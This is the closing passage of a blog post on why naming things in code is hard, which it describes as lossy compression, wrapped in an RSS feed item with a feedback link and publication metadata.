<p>However, writing meaningful names is a lossy compression. Every naming maxim follows from minimising this loss.</p>

<p>And finally, the same idea applies to naming things in the real world. Except, it‚Äôs even harder, since it‚Äôs encoding from an imprecise to another imprecise language. Code, atleast, was unambiguous in its execution.</p>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/divider.jpg" alt="">
    
    
    
</figure>

<blockquote>
  <p>Thanks to Soumya for reading drafts of this.</p>
</blockquote>

<p>Have feedback? You can <a href="https://twitter.com/neilkakkar/status/1361611070331305986" target="_blank" rel="noopener">reply to this post on Twitter</a>.</p>


    
  </div></div>]]>
            </description>
            <link>https://neilkakkar.com/why-is-naming-things-hard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26173903</guid>
            <pubDate>Thu, 18 Feb 2021 00:35:36 GMT</pubDate>
        </item>
    </channel>
</rss>
